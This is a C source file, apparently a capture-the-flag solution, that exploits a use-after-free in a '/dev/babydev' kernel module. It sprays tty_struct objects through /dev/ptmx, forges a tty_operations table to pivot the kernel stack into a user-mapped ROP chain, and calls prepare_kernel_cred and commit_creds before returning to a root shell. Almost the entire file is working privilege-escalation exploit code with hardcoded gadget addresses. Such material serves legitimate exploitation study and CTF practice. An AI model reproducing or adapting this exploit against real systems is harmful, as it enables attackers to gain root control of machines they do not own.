#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>


#define NUM_SPRAY 0x100


unsigned long long tty_operations[0x20];

unsigned long long addr_pivot = 0xffffffff8108cbf5; // : mov esp, 0x1428dd2 ; ret
unsigned long long addr_pop_rdi = 0xffffffff810d238d; // : pop rdi ; ret
unsigned long long addr_mov_rdi_rax_call_rcx = 0xffffffff8105b084; // : mov rdi, rax ; call rcx
unsigned long long addr_pop_rcx = 0xffffffff8100700c; // : pop rcx ; ret
unsigned long long addr_swapgs_pop_rbp = 0xffffffff81063694; // : swapgs ; pop rbp ; ret
unsigned long long addr_iretq = 0xffffffff8181a797;

unsigned long long addr_commit_creds = 0xffffffff810a1420; // T commit_creds
unsigned long long addr_prepare_kernel_cred = 0xffffffff810a1810; // T prepare_kernel_cred


unsigned long long user_cs;
unsigned long long user_rflags;
unsigned long long user_ss;
void save_state(void) {
    __asm__ volatile (
            "mov %0, cs\n\t"
            "pushfq\n\t"
            "pop %1\n\t"
            "mov %2, ss\n\t"
            : "=r"(user_cs), "=r"(user_rflags), "=r"(user_ss)
            :
            : "memory"
            );
}


void shell(void) {
    system("/bin/sh");
}


int main(void) {
    int i;
    int fds[2];
    int fds_ptmx[NUM_SPRAY];
    char tty_struct[0x2e0];


    puts("[+] Open /dev/babydev twice");
    fds[0] = open("/dev/babydev", O_RDWR);
    if (fds[0] < 0) {
        perror("open0");
        return 1;
    }
    fds[1] = open("/dev/babydev", O_RDWR);
    if (fds[1] < 0) {
        perror("open1");
        return 1;
    }

    save_state();

    puts("[+] Change buf size to 0x2e0");
    ioctl(fds[0], 0x10001, 0x2e0);

    puts("[+] Free chunk from one file and spray tty_struct");
    close(fds[1]);
    for (i = 0; i < NUM_SPRAY; ++i) {
        fds_ptmx[i] = open("/dev/ptmx", O_NOCTTY | O_RDWR);
    }
    puts("[+] Overlapped tty_struct");

    puts("[+] Read original tty_struct");
    read(fds[0], tty_struct, sizeof(tty_struct) - 1);

    unsigned long long addr_stack = 0x1428dd2;
    unsigned long long addr_mmap = addr_stack & (~0xfff);
    if (mmap((void *)addr_mmap, 0x20000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0) != (void *)addr_mmap) {
        perror("mmap");
        return 1;
    }

    unsigned long long *stack = (unsigned long long *)addr_stack;
    *stack ++= addr_pop_rdi;
    *stack ++= 0ULL;
    *stack ++= addr_prepare_kernel_cred;
    *stack ++= addr_pop_rcx;
    *stack ++= addr_commit_creds + 6;
    *stack ++= addr_mov_rdi_rax_call_rcx;
    *stack ++= addr_swapgs_pop_rbp;
    *stack ++= addr_mmap + 0x2000;
    *stack ++= addr_iretq;
    *stack ++= (unsigned long long)shell;
    *stack ++= user_cs;
    *stack ++= user_rflags;
    *stack ++= addr_mmap + 0x5000;
    *stack ++= user_ss;

    // memset(tty_operations, 0, sizeof(tty_operations));
    tty_operations[12] = addr_pivot; // ioctl
    // tty_operations[31] = (unsigned long long)malloc(0x1000); // proc_fops
    *(unsigned long long *)(tty_struct + 24) = (unsigned long long)tty_operations; // tty_operations

    puts("[+] Write forged tty_struct");
    write(fds[0], tty_struct, sizeof(tty_struct) - 1);

    puts("[+] trigger");
    for (i = 0; i < NUM_SPRAY; ++i) {
        printf("[*] Test fds_ptmx[%d]\n", i);
        // One of it should be overlapping
        ioctl(fds_ptmx[i], 0, 0);
    }

    return 0;
}
